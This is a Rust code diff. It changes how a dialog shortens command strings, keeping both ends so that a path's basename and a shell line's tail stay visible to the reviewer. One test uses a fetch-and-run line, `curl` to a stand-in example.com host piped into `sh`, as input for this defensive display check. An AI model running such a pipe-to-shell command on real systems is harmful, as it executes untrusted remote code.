@@ -129,20 +129,32 @@ impl App {
     }
 }
 
-/// Keep one claim on one dialog line. The tail matters more than the
-/// head for spotting something hostile (`… | sh`), but the head is
-/// what identifies the binary — so keep the head and mark the cut.
+/// Keep one claim on one dialog line, eliding the MIDDLE.
+///
+/// Both ends carry the signal and the middle rarely does. For a path
+/// the basename is what identifies it (`claude-multi.sh`); for a shell
+/// line the tail is where the payload hides (`… | sh`). Head-only
+/// truncation threw away exactly the half a reader needs — the first
+/// real dialog, against mnml's own manifest, rendered
+/// `multi-repo: /Users/chrismclennan/Projects/tattle-cl…`, which says
+/// nothing about what would actually run.
 fn truncate_command(cmd: &str) -> String {
-    const MAX: usize = 52;
+    const MAX: usize = 72;
     let clean: String = cmd
         .chars()
         .map(|c| if c.is_control() { ' ' } else { c })
         .collect();
-    if clean.chars().count() <= MAX {
+    let n = clean.chars().count();
+    if n <= MAX {
         return clean;
     }
-    let head: String = clean.chars().take(MAX - 1).collect();
-    format!("{head}…")
+    // Bias slightly toward the tail: a long path's meaning is
+    // concentrated in its last couple of segments.
+    let tail_len = (MAX - 1) / 2 + (MAX - 1) % 2;
+    let head_len = MAX - 1 - tail_len;
+    let head: String = clean.chars().take(head_len).collect();
+    let tail: String = clean.chars().skip(n - tail_len).collect();
+    format!("{head}…{tail}")
 }
 
 #[cfg(test)]
@@ -155,11 +167,38 @@ mod tests {
     }
 
     #[test]
-    fn truncate_marks_the_cut() {
+    fn truncate_marks_the_cut_and_bounds_the_width() {
         let long = "a".repeat(200);
         let out = truncate_command(&long);
-        assert!(out.ends_with('…'));
-        assert!(out.chars().count() <= 52);
+        assert!(out.contains('…'));
+        assert!(out.chars().count() <= 72);
+    }
+
+    #[test]
+    fn truncate_keeps_the_basename_of_a_long_path() {
+        // The regression this function was rewritten for: the real
+        // dialog hid `claude-multi.sh`, the only part identifying what
+        // would run.
+        let p =
+            "multi-repo: /Users/chrismclennan/Projects/tattle-claude-workspace/bin/claude-multi.sh";
+        let out = truncate_command(p);
+        assert!(
+            out.contains("claude-multi.sh"),
+            "basename must survive: {out}"
+        );
+        assert!(
+            out.starts_with("multi-repo: /Users"),
+            "head identifies it too: {out}"
+        );
+        assert!(out.chars().count() <= 72);
+    }
+
+    #[test]
+    fn truncate_keeps_the_tail_of_a_piped_shell_line() {
+        // The other signal-bearing end: a payload hides in the tail.
+        let cmd = format!("curl https://{}.example.com/x | sh", "a".repeat(80));
+        let out = truncate_command(&cmd);
+        assert!(out.ends_with("| sh"), "pipe target must survive: {out}");
     }
 
     #[test]
